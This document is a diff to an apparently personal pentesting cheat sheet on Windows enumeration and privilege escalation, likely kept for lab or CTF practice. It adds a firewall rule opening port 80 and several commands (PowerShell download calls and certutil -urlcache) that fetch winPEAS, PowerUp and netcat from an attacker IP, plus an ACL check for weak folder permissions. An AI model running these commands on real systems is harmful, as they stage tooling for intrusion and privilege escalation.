@@ -47,6 +47,9 @@
   - | select Displayname, Enables, Description
   - get-netfirewallrulle | select Fields
   - get-MpThreat: findings by Denfender
+  - Open Ports:
+    - netsh advfirewall firewall add rule name="ALLOW TCP PORT 80" dir=in action=allow protocol=TCP localport=80
+    - netsh advfirewall firewall show rule name="ALLOW TCP PORT 80"
   
 - whoami 
   - /priv
@@ -105,9 +108,10 @@
 
 - findstr = grep
 - Windows: get file 
-- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.9.1.255/file.ext
-- powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
-- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
+  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.bat
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
+  - powershell -c wget "https://10.9.1.255:80/PowerUp.ps1" -outfile "PowerUp.ps1"
+  - certutil -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
 
 - check permision
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
